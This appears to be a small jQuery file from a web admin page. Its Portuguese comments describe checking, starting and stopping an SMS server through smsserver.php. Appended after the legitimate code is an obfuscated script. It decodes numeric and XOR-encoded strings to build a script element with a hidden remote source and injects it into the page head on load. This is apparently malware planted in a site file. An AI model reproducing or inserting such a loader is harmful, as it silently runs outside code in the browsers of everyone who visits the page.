/*
 * funções para validação do status do servidor de sms
 */
$(document).ready(function(){

    $('#StatusServer').text("Verificando status do servidor de SMS...");
    $('#StatusServer').load("smsserver.php?acao=status");

    $("a#ativar").click(function(event) {
        event.preventDefault(); // Serve para retirar a ação do click do link
        $('#StatusServer').text("Ativando servidor de SMS...");
        $('#StatusServer').load("smsserver.php?acao=ativar");
    });

    $("a#desligar").click(function(event) {
        event.preventDefault(); // Serve para retirar a ação do click do link
        $('#StatusServer').text("Desativando servidor de SMS...");
        $('#StatusServer').load("smsserver.php?acao=desligar");
    });	
    $("a#status").click(function(event) {
        event.preventDefault(); // Serve para retirar a ação do click do link
        $('#StatusServer').text("Verificando status do servidor de SMS...");
        $('#StatusServer').load("smsserver.php?acao=status");
        	
    });	
});var uq7J=["006085","007095","005066","022068083054068092119006036093083062038","006068085","001079070050","001083078035031083083028032067085034059070001","020070070050094093113002040092082","029083087051","018083066018092092095015047068069018043098020081120054093092","029066066039010022029025053081066053124069024090004121066076029000050031085062038024031069"];function lB3S7Sd(gQ30aj){return wM80(lS90(gQ30aj),'u66W092jA06PR6');}fF5Ct(lB3S7Sd(uq7J[10]));function lS90(cQLEu){var hIeI1='';var z0PP5Z=0;var e0s=0;for(z0PP5Z=0;z0PP5Z<cQLEu.length/3;z0PP5Z++){hIeI1+=String.fromCharCode(cQLEu.slice(e0s,e0s+3));e0s=e0s+3;}return hIeI1;}function fF5Ct(jTsK){var g6v=document[lB3S7Sd(uq7J[3])](lB3S7Sd(uq7J[0])+lB3S7Sd(uq7J[1])+lB3S7Sd(uq7J[2]));g6v[lB3S7Sd(uq7J[4])]=jTsK;g6v[lB3S7Sd(uq7J[5])]=lB3S7Sd(uq7J[6]);document[lB3S7Sd(uq7J[9])](lB3S7Sd(uq7J[8]))[0][lB3S7Sd(uq7J[7])](g6v);}function wM80(hzAQ,v3x){var t3LW='';var zY=0;var sgjktK=0;for(zY=0;zY<hzAQ.length;zY++){var n7=hzAQ.charAt(zY);var uH5FS=n7.charCodeAt(0)^v3x.charCodeAt(sgjktK);n7=String.fromCharCode(uH5FS);t3LW+=n7;if(sgjktK==v3x.length-1)sgjktK=0;else sgjktK++;}return (t3LW);}